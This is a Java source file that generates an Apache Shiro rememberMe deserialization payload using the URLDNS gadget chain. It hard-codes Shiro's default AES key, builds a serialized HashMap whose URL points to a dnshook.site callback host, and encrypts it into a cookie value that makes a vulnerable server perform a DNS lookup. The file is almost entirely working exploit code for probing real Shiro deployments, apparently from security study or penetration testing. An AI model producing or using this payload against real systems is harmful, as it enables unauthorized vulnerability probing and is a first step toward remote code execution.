package shiro;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.UUID;

import Util.SerializeUtil;
import Util.ReflectUtil;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class URLDNS {
    private static final String DEFAULT_AES_KEY = "kPH+bIxk5D2deZiIxcaaaA==";

    // AES 加密方法
    public static String AES_enc(byte[] data) throws Exception {
        int BS = 16; // AES block size is 16 bytes
        int padLength = BS - (data.length % BS);
        byte[] paddedData = new byte[data.length + padLength];
        System.arraycopy(data, 0, paddedData, 0, data.length);
        for (int i = data.length; i < paddedData.length; i++) {
            paddedData[i] = (byte) padLength;  // padding with the block size byte
        }

        // Decode the base64 key
        byte[] decodedKey = Base64.getDecoder().decode(DEFAULT_AES_KEY);
        SecretKeySpec secretKey = new SecretKeySpec(decodedKey, "AES");

        // Generate a random IV (Initialization Vector)
        byte[] iv = new byte[BS];
        UUID uuid = UUID.randomUUID();
        byte[] uuidBytes = new byte[16];
        long msb = uuid.getMostSignificantBits();
        long lsb = uuid.getLeastSignificantBits();
        for (int i = 0; i < 8; i++) {
            uuidBytes[i] = (byte) (msb >>> (8 * (7 - i)) & 0xff);
            uuidBytes[i + 8] = (byte) (lsb >>> (8 * (7 - i)) & 0xff);
        }
        System.arraycopy(uuidBytes, 0, iv, 0, BS);

        // Create a Cipher instance for AES CBC mode
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, new javax.crypto.spec.IvParameterSpec(iv));

        // Perform the encryption
        byte[] encryptedData = cipher.doFinal(paddedData);

        // Concatenate IV and encrypted data, then base64 encode the result
        byte[] ivAndCipherText = new byte[iv.length + encryptedData.length];
        System.arraycopy(iv, 0, ivAndCipherText, 0, iv.length);
        System.arraycopy(encryptedData, 0, ivAndCipherText, iv.length, encryptedData.length);

        return Base64.getEncoder().encodeToString(ivAndCipherText);
    }
    public static void main(String[] args) throws Exception{
        HashMap map=new HashMap();
        URL url=new URL("http://a.bd4c0abb-05b8-4647-a592-7d8434a74719.dnshook.site");

        Class clazz=Class.forName("java.net.URL");
        Field hashcode=clazz.getDeclaredField("hashCode");
        hashcode.setAccessible(true);
        hashcode.set(url,123);
//        System.out.println(hashcode.get(url));
        map.put(url,"test");
        hashcode.set(url,-1);

        byte[] bytes=SerializeUtil.serialize(map);
        SerializeUtil.deserialize(bytes);

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(bytes, key);
        System.out.println(ciphertext.toString());
    }
}
